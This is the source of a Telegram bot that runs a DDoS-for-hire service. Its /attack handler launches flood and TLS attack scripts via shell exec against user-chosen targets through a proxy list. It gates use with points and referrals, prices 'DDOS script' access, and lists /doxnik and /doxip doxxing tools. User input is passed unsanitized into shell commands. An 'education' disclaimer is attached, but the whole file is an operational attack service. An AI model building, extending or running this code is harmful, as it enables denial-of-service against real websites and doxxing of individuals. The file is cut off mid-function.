// menu.js
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const fetch = (...args) => import("node-fetch").then(({ default: fetch }) => fetch(...args));
const path = require('path');
const axios = require('axios');
const os = require('os');
const dns = require("dns").promises;
const readline = require('readline');
const { nikParser } = require('nik-parser');
const AdmZip = require("adm-zip");
const https = require("https");
const FormData = require("form-data");
const cheerio = require("cheerio");
const archiver = require("archiver");
const JsConfuser = require("js-confuser");
const url = require('url');
const net = require('net');
const unzipper = require("unzipper");
const { exec } = require('child_process');
const { PassThrough } = require('stream');
const { sampah, log } = require('./lib/cache/http.js');
const SplitFile = require('split-file');
const UserAgent = require('user-agents');
const config = require("./config.js");

const BOT_NAME = config.BOT_NAME;
const TELEGRAM_TOKEN = config.TELEGRAM_TOKEN;
const OWNER_ID = config.OWNER_ID;

const INDEX_PATH = path.join(__dirname, "index.js");

// === Bot Initialization ===
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

module.exports = { bot };

function createProgressBar(completed, total, len = 10) {
  if (total <= 0) total = 1;
  const perc = completed / total;
  const filled = Math.round(perc * len);
  const empty = len - filled;
  return '█'.repeat(filled) + '▒'.repeat(empty) + ` ${Math.round(perc * 100)}%`;
}

// ================== PROXY & UA AUTOCREATE ==================
const PROXY_FILE = 'proxy.txt';
const UA_FILE = 'ua.txt';

async function fetchWithTimeout(urlToFetch, timeout = 10000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);
  try {
    const res = await fetch(urlToFetch, { signal: controller.signal });
    clearTimeout(timer);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.text();
  } catch (err) {
    clearTimeout(timer);
    throw err;
  }
}

async function writeSafeFile(filePath, data) {
  try {
    await fs.promises.writeFile(filePath, data, 'utf8');
  } catch {
    await fs.promises.writeFile(filePath, '', 'utf8');
  }
}

async function scrapeProxy(retries = 2) {
  for (let i = 0; i <= retries; i++) {
    try {
      const data = await fetchWithTimeout(sampah, 10000);
      if (!data.trim()) throw new Error('Content is empty');
      await writeSafeFile(PROXY_FILE, data);
      return true;
    } catch {
      if (i === retries) {
        await writeSafeFile(PROXY_FILE, '');
        return false;
      }
      await new Promise(r => setTimeout(r, 1500));
    }
  }
}

async function scrapeUserAgent(retries = 2) {
  for (let i = 0; i <= retries; i++) {
    try {
      const data = await fetchWithTimeout(log, 10000);
      if (!data.trim()) throw new Error('Content is empty');
      await writeSafeFile(UA_FILE, data);
      return true;
    } catch {
      if (i === retries) {
        await writeSafeFile(UA_FILE, '');
        return false;
      }
      await new Promise(r => setTimeout(r, 1500));
    }
  }
}

async function initResources() {
  await Promise.allSettled([scrapeProxy(), scrapeUserAgent()]);
  if (!fs.existsSync(PROXY_FILE)) await writeSafeFile(PROXY_FILE, '');
  if (!fs.existsSync(UA_FILE)) await writeSafeFile(UA_FILE, '');
}

(async () => {
  await initResources();
})();

const ongoingAttacks = [];

// ==================== PUSH ONGOING ====================
function pushOngoing(target, method, durationSeconds, stopFn = null) {
  if (!target || !method) throw new Error("Invalid args to pushOngoing");
  const duration = Number(durationSeconds);
  if (Number.isNaN(duration) || duration <= 0) throw new Error("Duration must be positive");

  const key = `${target}|${method}`;
  if (ongoingAttacks.some(o => o.key === key)) throw new Error("Attack already ongoing for this target+method");

  const startTs = Date.now();
  const endsAt = startTs + duration * 1000;

  const item = {
    key,
    target,
    method,
    duration,
    startTs,
    endsAt,
    stopFn,
    timeoutId: null
  };

  // Auto-stop & cleanup exactly when duration ends (+100ms buffer)
  item.timeoutId = setTimeout(() => {
    const idx = ongoingAttacks.findIndex(o => o.key === key);
    if (idx !== -1) {
      try { if (typeof ongoingAttacks[idx].stopFn === "function") ongoingAttacks[idx].stopFn(); } catch (e) {}
      ongoingAttacks.splice(idx, 1);
      console.log(`🕒 Attack ${key} stopped automatically after ${duration}s`);
    }
  }, duration * 1000 + 100);

  ongoingAttacks.push(item);
  console.log(`🚀 Attack started: ${key} for ${duration}s`);
  return item;
}

function listOngoing() {
  return ongoingAttacks.map(o => ({
    target: o.target,
    method: o.method,
    duration: o.duration,
    started: new Date(o.startTs).toISOString(),
    endsAt: new Date(o.endsAt).toISOString()
  }));
}

// ==================== RUN ATTACK ====================
async function runAttack(botInstance, chatId, target, method, duration) {
  const metodePath = path.join(__dirname, `/lib/cache/${method}`);
  const args = [metodePath, target, duration, "100", "100", "proxy.txt"];

  const child = exec("node " + args.map(a => `"${a}"`).join(' '), { stdio: "ignore", detached: true });

  // stopFn for exact duration
  const stopFn = () => {
    try {
      process.kill(-child.pid, "SIGTERM");
    } catch (e) {
      try { child.kill("SIGTERM"); } catch (_) {}
    }
    setTimeout(() => {
      try { process.kill(-child.pid, "SIGKILL"); } catch (e) {
        try { child.kill("SIGKILL"); } catch (_) {}
      }
    }, 500);
  };

  const item = pushOngoing(target, method, duration, stopFn);

  // Duration ends → auto stop via pushOngoing
  child.on("exit", (code, signal) => {
    const idx = ongoingAttacks.findIndex(o => o.key === item.key);
    if (idx !== -1) {
      clearTimeout(ongoingAttacks[idx].timeoutId);
      ongoingAttacks.splice(idx, 1);
    }
    console.log(`Child exited pid=${child.pid} code=${code} signal=${signal}`);
  });

  // Start message
  const endAt = new Date(item.endsAt).toLocaleTimeString();
  try {
    await botInstance.sendMessage(
      chatId,
      `✅ Attack on <b>${target}</b> started (${method}) for ${duration} seconds.\n🕒 Ends at: ${endAt}`,
      { parse_mode: "HTML" }
    );
  } catch (e) {}

  // Finish message exactly on time
  setTimeout(async () => {
    try {
      await botInstance.sendMessage(
        chatId,
        `✅ Attack on <b>${target}</b> finished after ${duration} seconds.`,
        { parse_mode: "HTML" }
      );
    } catch (_) {}
  }, duration * 1000 + 200);
}

const CHANNEL_USERNAME = config.CHANNEL_USERNAME;
const CHANNEL_ID = config.CHANNEL_ID;
const CHANNEL_LINK = config.CHANNEL_LINK;
const POINTS_FILE = './database/poin.json';
const REF_FILE = './database/referrals.json';
const CLICK_FILE = './database/clicks.json';
const CHANNEL_FILE = './database/channel.json';

[POINTS_FILE, REF_FILE, CLICK_FILE, CHANNEL_FILE].forEach(file => {
  if (!fs.existsSync(file)) fs.writeFileSync(file, '{}', 'utf8');
});

function loadJSON(path) {
  try { return JSON.parse(fs.readFileSync(path, 'utf8') || '{}'); } catch { return {}; }
}
function saveJSON(path, data) { fs.writeFileSync(path, JSON.stringify(data, null, 2), 'utf8'); }

function getPoints(id) {
  const data = loadJSON(POINTS_FILE);
  return data[id] || 0;
}
function setPoints(id, val) {
  const data = loadJSON(POINTS_FILE);
  data[id] = val;
  saveJSON(POINTS_FILE, data);
}
function incrementPoints(id, by = 2) {
  const data = loadJSON(POINTS_FILE);
  data[id] = (data[id] || 0) + by;
  saveJSON(POINTS_FILE, data);
  return data[id];
}
function resetPoints(id) {
  const data = loadJSON(POINTS_FILE);
  if (data[id]) {
    data[id] = 0;
    saveJSON(POINTS_FILE, data);
  }
}
function consumePoint(id, amount) {
  const data = loadJSON(POINTS_FILE);
  const current = data[id] || 0;
  if (current < amount) return false;
  data[id] = current - amount;
  saveJSON(POINTS_FILE, data);
  return true;
}
function getTotalUsers() {
  const data = loadJSON(POINTS_FILE);
  return Object.keys(data).length;
}

function setReferral(userId, refId) {
  const data = loadJSON(REF_FILE);
  data[userId] = refId;
  saveJSON(REF_FILE, data);
}
function hasReferral(userId) {
  const data = loadJSON(REF_FILE);
  return !!data[userId];
}

function hasClicked(refId, userId) {
  const data = loadJSON(CLICK_FILE);
  if (!data[refId]) data[refId] = [];
  return data[refId].includes(userId);
}
function recordClick(refId, userId) {
  const data = loadJSON(CLICK_FILE);
  if (!data[refId]) data[refId] = [];
  if (!data[refId].includes(userId)) data[refId].push(userId);
  saveJSON(CLICK_FILE, data);
}

function loadChannelData() { return loadJSON(CHANNEL_FILE); }
function saveChannelData(data) { saveJSON(CHANNEL_FILE, data); }
function hasJoinedBefore(userId) { return !!loadChannelData()[userId]; }
function markAsJoined(userId) {
  const data = loadChannelData();
  if (!data[userId]) {
    data[userId] = true;
    saveChannelData(data);
  }
}
async function resolveChannelId() {
  try {
    if (CHANNEL_ID) return CHANNEL_ID;
    if (!CHANNEL_USERNAME) return null;

    if (CHANNEL_USERNAME.startsWith("+")) {
      const joined = await bot.joinChatInviteLink(`https://t.me/${CHANNEL_USERNAME}`).catch(() => null);
      if (joined && joined.id) return joined.id;
      const chat = await bot.getChat(`https://t.me/${CHANNEL_USERNAME}`).catch(() => null);
      if (chat && chat.id) return chat.id;
      return null;
    }

    const chat = await bot.getChat(`@${CHANNEL_USERNAME}`).catch(() => null);
    if (chat && chat.id) return chat.id;

    return null;
  } catch {
    return null;
  }
}

async function isUserInChannel(userId) {
  try {
    const chId = await resolveChannelId();
    if (!chId) return false;
    const member = await bot.getChatMember(chId, userId).catch(() => null);
    if (!member) return false;
    return ['member', 'administrator', 'creator'].includes(member.status);
  } catch {
    return false;
  }
}
async function autoResetAndBanIfLeft(userId) {
  try {
    const pernahJoin = hasJoinedBefore(userId);
    if (!pernahJoin) return;

    const joinedCh = await isUserInChannel(userId);
    const points = getPoints(userId);

    if (!joinedCh) {
      if (points > 0) resetPoints(userId);
      try {
        await bot.banChatMember(CHANNEL_ID, userId);
        console.log(`🚫 User ${userId} left channel — points reset & banned.`);
      } catch (err) {
        console.log(`❌ Failed to ban user ${userId} from channel:`, err.message);
      }
    }
  } catch (err) {
    console.error(`⚠️ Failed to check status of user ${userId}:`, err.message);
  }
}

function sanitizeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function asHtmlBlockFromPlain(captionPlain) {
  const safeHtml = sanitizeHtml(captionPlain);
  return `<blockquote><pre>${safeHtml}</pre></blockquote>`;
}

const asIdString = (id) => String(id);

bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = asIdString(msg.from.id);
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
  const startParam = match && match[1] ? match[1].trim() : null;

  await autoResetAndBanIfLeft(userId);

  if (startParam) {
    const refId = startParam.replace(/^ref_/, "");
    if (refId && refId !== userId) {
      if (!hasClicked(refId, userId)) {
        recordClick(refId, userId);
        incrementPoints(refId, 2);
        try {
          await bot.sendMessage(
            refId,
            `🎉 Someone used your link!\nYou got *2 points* (Total: ${getPoints(refId)})`,
            { parse_mode: "Markdown" }
          );
        } catch {}
      }
      if (!hasReferral(userId)) setReferral(userId, refId);
    }
  }

  const joinedCh = await isUserInChannel(userId);

  if (!joinedCh) {
    await bot.sendMessage(
      chatId,
      `🚫 *Access Denied!*\n\nYou must join the *channel* first to use this bot.`,
      {
        parse_mode: "Markdown",
        disable_web_page_preview: true,
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Already Joined", callback_data: "cek_join" }],
            [{ text: "📢 Join Channel", url: `https://t.me/${CHANNEL_USERNAME}` }],
          ],
        },
      }
    );
    return;
  }

  if (!hasJoinedBefore(userId)) {
    incrementPoints(userId, 2);
    markAsJoined(userId);
  }

  const totalUsers = getTotalUsers();
  const caption = `⚰️ HELP ME

( 🕊️ ) - Hello ${username}👋🏻

This is testing bot 
⌬ By  : @Dark_is_the_nigth
⌬ For : Education Proposed
⌬ Total Users : ${totalUsers}
⌬ Your Points : ${getPoints(userId)}

🔗 Referral Link!
https://t.me/${BOT_NAME}?start=ref_${userId}

⚠️ DISCLAIMER! 
Don't use it to attack the gov. Website and education websites. If you do you will get jailed.
`;

  const buttons = [
    [
      { text: "Attack Menu", callback_data: "command_menu" },
      { text: "Buy Access", callback_data: "buy_poin" },
    ],
    [
      { text: "Owner Menu", callback_data: "owner_menu" },
      { text: "Tools Menu", callback_data: "tools_menu" },
    ],
    [{ text: "Developer", url: "@Dark_is_the_nigth" }],
  ];

  await bot.sendVideo(chatId, "https://files.catbox.moe/7a2q92.mp4", {
    caption: asHtmlBlockFromPlain(caption),
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons },
  });
});

// ====== CALLBACK HANDLER ======
bot.on("callback_query", async (query) => {
  const { from, data, message } = query;
  const chatId = message.chat.id;
  const userId = asIdString(from.id);

  if (data === "cek_join") {
    const joinedCh = await isUserInChannel(userId);

    if (!joinedCh) {
      resetPoints(userId);
      await bot.answerCallbackQuery(query.id, {
        text: "❌ You haven't joined the channel!",
        show_alert: true,
      });
      return;
    } else {
      await bot.answerCallbackQuery(query.id, {
        text: "✅ Already joined channel!",
        show_alert: true,
      });
      if (!hasJoinedBefore(userId)) {
        incrementPoints(userId, 2);
        markAsJoined(userId);
      }
    }
  }

  // === BUY POINTS MENU ===
  if (data === "buy_poin") {
    const buyCaption = `💰 ACCESS PRICE LIST

$0.50 : DDOS script (no encryption)
$0.30 : DDOS script (encrypted, free update)
$0.20 : VIP access
$0.10 : 500 points
`;
    await bot.editMessageCaption(asHtmlBlockFromPlain(buyCaption), {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⬅️ Back", callback_data: "back_to_menu" }],
          [{ text: "👤 Developer", url: "pp@Dark_is_the_nigth" }],
        ],
      },
    });
  }

  if (data === "tools_menu") {
    const cmdCaption = `👾 T O O L S - M E N U

=> 𝘔𝘌𝘕𝘜 𝘛𝘖𝘖𝘓𝘚 <=
/redeem <code>
/doxnik <nik>
/doxip <ip>
/brat <text>
/iqc 
/poin
`;
    await bot.editMessageCaption(asHtmlBlockFromPlain(cmdCaption), {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "⬅️ Back", callback_data: "back_to_menu" }]],
      },
    });
  }
  // === COMMAND MENU ===
  if (data === "command_menu") {
    const cmdCaption = `👾 A T T A C K - M E N U

=> 𝘔𝘌𝘕𝘜 𝘈𝘛𝘛𝘈𝘊𝘒 <=
/attack <link> 77777 flood
/ddos <link> flood
/ping <link>
/methods
`;
    await bot.editMessageCaption(asHtmlBlockFromPlain(cmdCaption), {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "⬅️ Back", callback_data: "back_to_menu" }]],
      },
    });
  }

  // === OWNER MENU ===
  if (data === "owner_menu") {
    if (userId !== OWNER_ID) {
      await bot.answerCallbackQuery(query.id, {
        text: "🚫 Only Owner can open this menu!",
        show_alert: true,
      });
      return;
    }

    const ownerCaption = `👾 O W N E R - M E N U

=> 𝘔𝘌𝘕𝘜 𝘖𝘞𝘕𝘌𝘙 <=
/addpoin <id> <amount>
/delpoin <id>
/listpoin
/addres <id>
/delres <id>

/addvip <id>
/delvip <id>
/addkode <code>
/bedrocarct <reply>
/backup
/restart
`;
    await bot.editMessageCaption(asHtmlBlockFromPlain(ownerCaption), {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⬅️ Back", callback_data: "back_to_menu" }],
          [{ text: "Developer", url: "@Dark_is_the_nigth" }],
        ],
      },
    });
  }

  // === BACK TO MAIN MENU ===
  if (data === "back_to_menu") {
    const points = getPoints(userId);
    const totalUsers = getTotalUsers();
    const username = from.username ? `@${from.username}` : from.first_name;

    const mainCaption = `⚰️ HELP ME

( 🕊️ ) - Hello ${username}👋🏻

This is testing bot 
⌬ By  : @Dark_is_the_nigth
⌬ For : Education Proposed
⌬ Total Users : ${totalUsers}
⌬ Your Points : ${getPoints(userId)}


🔗 Referral Link!
https://t.me/${BOT_NAME}?start=ref_${userId}

⚠️ DISCLAIMER! 
Don't use it to attack the gov. Website and education websites. If you do you will get jailed.
`;

    const buttons = [
    [
      { text: "Attack Menu", callback_data: "command_menu" },
      { text: "Buy Access", callback_data: "buy_poin" },
    ],
    [
      { text: "Owner Menu", callback_data: "owner_menu" },
      { text: "Tools Menu", callback_data: "tools_menu" },
    ],
    [{ text: "Developer", url: "@Dark_is_the_nigth" }],
  ];

    await bot.editMessageCaption(asHtmlBlockFromPlain(mainCaption), {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: buttons },
    });
  }
});
bot.onText(/^\/restart$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();

  if (userId !== OWNER_ID) {
    return bot.sendMessage(chatId, '❌ You are not the owner!');
  }

  try {
    let sentMessage = await bot.sendMessage(
      chatId,
      `<b>♻️ Restarting bot...</b>\n<pre>${createProgressBar(0)} 0%</pre>`,
      { parse_mode: 'HTML' }
    );

    console.log(`[${new Date().toLocaleTimeString()}] Restart requested by Owner (${userId})`);

    let percentage = 0;
    const interval = setInterval(async () => {
      percentage += 20;

      if (percentage >= 100) {
        clearInterval(interval);
        await bot.editMessageText(
          `✅ <b>Bot restarted successfully!</b>\n<pre>${createProgressBar(100)} 100%</pre>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: 'HTML'
          }
        );

        setTimeout(() => process.exit(1), 1200); // auto restart
      } else {
        await bot.editMessageText(
          `<b>♻️ Restarting bot...</b>\n<pre>${createProgressBar(percentage)} ${percentage}%</pre>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: 'HTML'
          }
        );
      }
    }, 800);
  } catch (err) {
    console.error('❌ Failed to restart:', err);
    bot.sendMessage(chatId, '❌ An error occurred while trying to restart the bot.');
  }
});
function randomFileName(ext) {
  return path.join(__dirname, `${Date.now()}_${Math.random().toString(36).slice(2)}.${ext}`);
}

// Helper: Extract JS and CSS URLs from HTML
function extractResourceUrls(html, baseUrl) {
  const jsRegex = /<script[^>]+src=["']([^"']+)["']/gi;
  const cssRegex = /<link[^>]+href=["']([^"']+)["'][^>]*rel=["']stylesheet["']/gi;

  const urls = { js: [], css: [] };
  let match;

  while ((match = jsRegex.exec(html))) urls.js.push(new URL(match[1], baseUrl).href);
  while ((match = cssRegex.exec(html))) urls.css.push(new URL(match[1], baseUrl).href);

  return urls;
}

bot.onText(/\/gethtml (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1].trim();

  try {
    const progressMsg = await bot.sendMessage(
      chatId,
      "```Processing!\n▱▱▱▱▱▱▱▱▱▱ 0%```",
      { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' }
    );

    const updateProgress = async (percent) => {
      await bot.editMessageText(
        `\`\`\`\nProcessing!\n${createProgressBar(percent)} ${percent}%\`\`\``,
        {
          chat_id: chatId,
          message_id: progressMsg.message_id,
          parse_mode: 'Markdown'
        }
      );
    };

    const { data: html } = await axios.get(url, { timeout: 15000 });
    await updateProgress(30);

    const { js, css } = extractResourceUrls(html, url);
    const zip = new AdmZip();

    zip.addFile('index.html', Buffer.from(html, 'utf-8'));
    await updateProgress(50);

    for (const cssUrl of css) {
      try {
        const { data: cssData } = await axios.get(cssUrl, { timeout: 10000 });
        const fileName = 'css/' + path.basename(new URL(cssUrl).pathname);
        zip.addFile(fileName, Buffer.from(cssData, 'utf-8'));
      } catch {
        console.warn('Failed to get CSS:', cssUrl);
      }
    }
    await updateProgress(70);

    for (const jsUrl of js) {
      try {
        const { data: jsData } = await axios.get(jsUrl, { timeout: 10000 });
        const fileName = 'js/' + path.basename(new URL(jsUrl).pathname);
        zip.addFile(fileName, Buffer.from(jsData, 'utf-8'));
      } catch {
        console.warn('Failed to get JS:', jsUrl);
      }
    }
    await updateProgress(90);

    const zipPath = randomFileName('zip');
    zip.writeZip(zipPath);
    await updateProgress(100);

    await bot.sendDocument(chatId, zipPath, {
      caption: `📦 All HTML, CSS, and JS code from:\n${url}`,
    });

    fs.unlinkSync(zipPath);
  } catch (err) {
    console.error('Error fetching code:', err.message);
    bot.sendMessage(chatId, '⚠️ Failed to fetch files from the link. Make sure the link is valid and accessible.');
  }
});
bot.onText(/^(?:\/|\.|)attack(?:@[\w_]+)?\s*$/i, async (msg) => {
  const chatId = msg.chat.id;
  try {
    await bot.sendMessage(chatId, '/attack <link> 77777 flood', { disable_web_page_preview: true });
  } catch (e) {
    console.log('sendMessage /attack example failed:', e.message);
  }
});
function wrapCodeBlock(text) {
  // if ``` in text, protect so it doesn't close code block prematurely
  return '```' + text.replace(/```/g, '`' + String.fromCharCode(8203) + '``') + '```';
}

const COOLDOWNS_FILE = path.join(__dirname, 'database', 'cooldowns.json');
const COOLDOWN_MS = 10 * 60 * 1000;


async function ensureCooldownFile() {
  try {
    if (!fs.existsSync(COOLDOWNS_FILE)) {
      fs.writeFileSync(COOLDOWNS_FILE, JSON.stringify({ users: {}, nocd: {} }, null, 2), 'utf8');
    }
  } catch (e) {
    console.error('[ensureCooldownFile]', e);
  }
}

async function loadCooldowns() {
  await ensureCooldownFile();
  try {
    const raw = fs.readFileSync(COOLDOWNS_FILE, 'utf8') || '{}';
    const data = JSON.parse(raw);
    if (!data.users) data.users = {};
    if (!data.nocd) data.nocd = {};
    return data;
  } catch (e) {
    console.error('[loadCooldowns]', e);
    return { users: {}, nocd: {} };
  }
}

async function saveCooldowns(obj) {
  try {
    fs.writeFileSync(COOLDOWNS_FILE, JSON.stringify(obj, null, 2), 'utf8');
  } catch (e) {
    console.error('[saveCooldowns]', e);
  }
}

function formatDurationMs(ms) {
  if (ms <= 0) return '0 seconds';
  let totalSec = Math.floor(ms / 1000);
  const days = Math.floor(totalSec / 86400);
  totalSec %= 86400;
  const hours = Math.floor(totalSec / 3600);
  totalSec %= 3600;
  const minutes = Math.floor(totalSec / 60);
  const seconds = totalSec % 60;
  const parts = [];
  if (days) parts.push(`${days} days`);
  if (hours) parts.push(`${hours} hours`);
  if (minutes) parts.push(`${minutes} minutes`);
  if (seconds) parts.push(`${seconds} seconds`);
  return parts.join(' ');
}

bot.onText(/^\/nocd(?:@[\w_]+)?\s+(\d+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = String(match[1]);

  if (senderId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Only OWNER can use this command.");
  }

  let data = await loadCooldowns();
  if (data.nocd[targetId]) {
    return bot.sendMessage(chatId, `ℹ️ User ID *${targetId}* is already in NO COOLDOWN mode.`, { parse_mode: "Markdown" });
  }

  data.nocd[targetId] = true;
  await saveCooldowns(data);

  return bot.sendMessage(chatId, `✅ *NO COOLDOWN* mode activated for user ID *${targetId}*. (Cooldown does not apply)`, { parse_mode: "Markdown" });
});

bot.onText(/^\/oncd(?:@[\w_]+)?\s+(\d+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = String(match[1]);

  if (senderId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Only OWNER can use this command.");
  }

  let data = await loadCooldowns();
  if (data.nocd[targetId]) {
    delete data.nocd[targetId];
    await saveCooldowns(data);
    return bot.sendMessage(chatId, `✅ *NO COOLDOWN* mode deactivated for user ID *${targetId}*. (Cooldown applies again)`, { parse_mode: "Markdown" });
  } else {
    return bot.sendMessage(chatId, `ℹ️ User ID *${targetId}* is not in NO COOLDOWN mode.`, { parse_mode: "Markdown" });
  }
});

bot.onText(/^(?:\/|\.|)attack(?:@[\w_]+)?\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = String(msg.from.id);
  const penggunaName = msg.from.username ? `@${msg.from.username}` : `${msg.from.first_name || ''} ${msg.from.last_name || ''}`.trim() || sender;
  let data = await loadCooldowns();

  if (!data.nocd) data.nocd = {};
  if (!data.users) data.users = {};

  if (!data.nocd[sender]) {
    const lastUsed = data.users[sender] || 0;
    const now = Date.now();
    const timePassed = now - lastUsed;

    if (timePassed < COOLDOWN_MS) {
      const remaining = COOLDOWN_MS - timePassed;
      const remStr = formatDurationMs(remaining);
      try {
        await bot.sendMessage(chatId, `⏳ Sorry ${penggunaName}, the /attack feature is still on cooldown.\nPlease try again in: *${remStr}*.`, { parse_mode: 'Markdown' });
      } catch (e) {}
      return;
    }
  }

  const userPoints = await getPoints(sender);
  if (userPoints <= 0) {
    const reply = '🚫 Share this link to get 2 points if a user clicks your link\n' +
      `https://t.me/${BOT_NAME}?start=ref_${sender}\n`;
    try { await bot.sendMessage(chatId, reply, { disable_web_page_preview: true }); } catch (e) {}
    return;
  }

  const argsRaw = (match && match[1]) ? match[1].trim() : '';
  const args = argsRaw ? argsRaw.split(/\s+/) : [];

  if (args.length < 3) {
    const usage = 'Example usage:\n/attack <target> <duration> <methods>\nExample:\n/attack https://google.com 120 flood';
    try { await bot.sendMessage(chatId, usage, { disable_web_page_preview: true }); } catch (e) {}
    return;
  }

  async function consumePoint(userId, amount = 1) {
    const points = await getPoints(userId);
    if (points >= amount) {
      await setPoints(userId, points - amount);
      return true;
    }
    return false;
  }

  const consumed = await consumePoint(sender, 1);
  if (!consumed) {
    try {
      await bot.sendMessage(chatId, '⚠️ Failed to use point — it seems your points are insufficient. Try again after collecting points.', { disable_web_page_preview: true });
    } catch (e) {}
    return;
  }

  // === Animation progress ===
  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

function renderBar(pct) {
  const total = 10; // bar length 10 blocks
  const filled = Math.round((pct / 100) * total);
  const empty = total - filled;
  return `[${"█".repeat(filled)}${"░".repeat(empty)}] ${pct}%`;
}

const target = args[0];
const durationRaw = args[1];
const methods = args[2];
const duration = Number(durationRaw);

const progressMsg = await bot.sendMessage(
  chatId,
  `🔄 *Processing...*\n\n\`\`\`\n${renderBar(0)}\n\`\`\`\n🎯 Target: ${target}`,
  { parse_mode: "Markdown" }
);

for (let pct = 5; pct <= 100; pct += 5) {
  await sleep(700);
  await bot.editMessageText(
    `🔄 *Processing...*\n\n\`\`\`\n${renderBar(pct)}\n\`\`\`\n🎯 Target: ${target}`,
    {
      chat_id: chatId,
      message_id: progressMsg.message_id,
      parse_mode: "Markdown"
    }
  );
}

  const now = Date.now();
  try {
    data.users[sender] = now;
    await saveCooldowns(data);
  } catch (e) {}

  if (Number.isNaN(duration) || duration <= 0) {
    try { await bot.sendMessage(chatId, 'Duration must be a positive number (seconds).'); } catch (_) {}
    return;
  }

  function formatDuration(ms) {
    let totalSec = Math.max(0, Math.floor(ms / 1000));
    const days = Math.floor(totalSec / 86400);
    totalSec %= 86400;
    const hours = Math.floor(totalSec / 3600);
    totalSec %= 3600;
    const minutes = Math.floor(totalSec / 60);
    const parts = [];
    if (days) parts.push(`${days} days`);
    if (hours) parts.push(`${hours} hours`);
    if (minutes) parts.push(`${minutes} minutes`);
    return parts.join(' ') || '0 minutes';
  }

  const endAt = Date.now() + duration * 1000;
  let endTimeStr = '-';
  try { endTimeStr = new Date(endAt).toLocaleString('id-ID', { timeZone: 'Asia/Makassar' }); } catch (e) { endTimeStr = new Date(endAt).toISOString(); }

  let hostname;
  try { hostname = new URL(target).hostname; } catch { hostname = target; }

  let result = {};
  try {
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    result = scrape.data || {};
  } catch {}

const out = `\`\`\`
✅ Process Complete

🎯 Target : ${target}
⏱️ Duration : ${duration} seconds
⚙️ Method : ${methods}
🌐 ISP    : ${result.isp || '-'}
💻 IP     : ${result.query || '-'}
🏢 AS     : ${result.as || '-'}
📅 Ends at: ${endTimeStr}
\`\`\``;

const ownerMsg = `\`\`\`
🔔 Notification of /attack usage
User : ${penggunaName} (id: ${sender})
Target   : ${target}
Duration   : ${duration} seconds
Method   : ${methods}
Ends at  : ${endTimeStr}
\`\`\``;

let ownerTargetUrl = target;
try {
  new URL(target);
} catch {
  ownerTargetUrl = `http://${target}`;
}

const ownerOpts = {
  parse_mode: 'Markdown',
  disable_web_page_preview: true,
  reply_markup: {
    inline_keyboard: [
      [{ text: 'Check Web', url: ownerTargetUrl }]
    ]
  }
};

try {
  await bot.sendMessage(OWNER_ID, ownerMsg, ownerOpts);
} catch (err) {
  console.log('notify OWNER_ID failed:', err.message);
}

const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
const opts = {
  reply_markup: {
    inline_keyboard: [
      [{ text: 'Check Target', url: checkUrl }]
    ]
  }
};

try {
  await bot.sendMessage(chatId, out, {
    parse_mode: 'Markdown',
    reply_markup: opts.reply_markup,
    disable_web_page_preview: true
  });
} catch (err) {
  console.log('sendMessage failed:', err.message);
}

const metode = path.join(__dirname, `/lib/cache/${methods}`);

  // helper to run exec and handle error + cleanup ongoingAttacks
  function runAttackCommand(cmd, onStartedMessage = 'Attack finished.') {
    exec(cmd, (err, stdout, stderr) => {
      if (err) {
        console.log('Exec error:', err.message);
        try { bot.sendMessage(chatId, `Failed to start attack process: ${err.message}`); } catch (_) {}
        const key = `${target}|${methods}`;
        const idx = ongoingAttacks.findIndex(o => o.key === key);
        if (idx !== -1) ongoingAttacks.splice(idx, 1);
        return;
      }
      console.log('Attack finished.');
      // send confirmation process started + check button
      const checkUrl2 = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
      const opts2 = {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'check', url: checkUrl2 }]
          ]
        }
      };
      try { bot.sendMessage(chatId, onStartedMessage, opts2); } catch (_) {}
    });
  }

  // choose method and run appropriate command
  if (methods === 'flood') {
    try {
      pushOngoing(target, methods, duration);
    } catch (e) {
      console.log('pushOngoing error:', e.message);
      try { await bot.sendMessage(chatId, `❗ ${e.message}`); } catch (_) {}
      return;
    }
    runAttackCommand(`node ${metode} ${target} ${duration} 100 100 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'strike') {
